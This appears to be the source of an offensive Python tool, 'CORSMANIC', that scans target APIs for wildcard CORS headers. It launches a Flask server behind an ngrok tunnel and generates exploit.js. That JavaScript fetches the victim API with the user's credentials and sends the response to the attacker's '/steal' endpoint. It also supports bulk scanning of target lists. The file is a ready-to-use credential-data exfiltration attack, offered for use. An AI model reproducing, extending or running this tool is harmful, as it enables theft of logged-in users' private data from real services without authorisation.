import subprocess
import time
import requests
import os
import signal

ngrok_process = None
flask_process = None

def start_flask_server():
    """Start Flask server"""
    global flask_process
    print("[+] Starting Flask server...")
    flask_process = subprocess.Popen(["python3", "server/app.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

def start_ngrok():
    """Start Ngrok and retrieve public URL"""
    global ngrok_process
    print("[+] Starting Ngrok tunnel...")
    ngrok_process = subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    time.sleep(3)
    
    try:
        ngrok_api = "http://127.0.0.1:4040/api/tunnels"
        tunnel_data = requests.get(ngrok_api).json()
        public_url = tunnel_data['tunnels'][0]['public_url']
        print(f"[+] Ngrok URL: {public_url}")
        return public_url
    except Exception as e:
        print(f"[!] Failed to retrieve Ngrok URL: {e}")
        cleanup()
        exit(1)

def scan_for_vulnerable_api(target_url):
    """Check if the target API is vulnerable to CORS misconfiguration"""
    print(f"[+] Scanning {target_url} for CORS vulnerabilities...")
    try:
        response = requests.get(target_url)
        headers = response.headers

        if "Access-Control-Allow-Origin" in headers and headers["Access-Control-Allow-Origin"] == "*":
            print(f"[+] Vulnerable API found: {target_url}")
            return target_url
        else:
            print(f"[-] No CORS misconfiguration detected at {target_url}.")
            return None
    except Exception as e:
        print(f"[!] Error scanning API {target_url}: {e}")
        return None

def generate_exploit_script(ngrok_url, target_api):
    """Generate JavaScript exploit script"""
    if not target_api:
        print("[!] No vulnerable API found. Skipping exploit generation.")
        return

    exploit_js = f"""
fetch("{target_api}", {{
    method: "GET",
    credentials: "include"
}})
.then(response => response.text())
.then(data => {{
    fetch("{ngrok_url}/steal?data=" + encodeURIComponent(data));
}});
"""
    with open("exploit.js", "w") as f:
        f.write(exploit_js)
    print("[+] Exploit script generated: exploit.js")

def scan_multiple_targets(file_path):
    """Scan multiple APIs from a file"""
    vulnerable_apis = []

    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()

        for url in urls:
            vulnerable = scan_for_vulnerable_api(url)
            if vulnerable:
                vulnerable_apis.append(vulnerable)

        if vulnerable_apis:
            print("[+] Vulnerable APIs found:")
            for api in vulnerable_apis:
                print(f"  - {api}")

            with open("vulnerable_apis.txt", "w") as f:
                for api in vulnerable_apis:
                    f.write(api + "\n")
            print("[+] Saved vulnerable APIs to vulnerable_apis.txt")
        else:
            print("[-] No vulnerabilities detected.")

    except FileNotFoundError:
        print(f"[!] File {file_path} not found.")
        exit(1)

    return vulnerable_apis

def cleanup(signum=None, frame=None):
    """Gracefully stop Flask and Ngrok"""
    print("\n[+] Stopping CORSMANIC...")

    if flask_process:
        flask_process.terminate()
        flask_process.wait()
        print("[+] Flask server stopped.")

    if ngrok_process:
        ngrok_process.terminate()
        ngrok_process.wait()
        print("[+] Ngrok process terminated.")

    subprocess.run(["pkill", "-f", "ngrok"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] All Ngrok processes killed.")
    exit(0)

def main():
    start_flask_server()
    ngrok_url = start_ngrok()
    
    target_input = input("Enter a single target API URL or a file path for multiple targets: ").strip()

    if os.path.isfile(target_input):
        vulnerable_apis = scan_multiple_targets(target_input)
    else:
        vulnerable_apis = [scan_for_vulnerable_api(target_input)] if scan_for_vulnerable_api(target_input) else []

    if vulnerable_apis:
        for api in vulnerable_apis:
            generate_exploit_script(ngrok_url, api)
        print("[+] CORSMANIC is running! Press Ctrl + C to stop.")
    else:
        print("[-] No vulnerable APIs found. Exiting.")
        cleanup()

    signal.signal(signal.SIGINT, cleanup)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
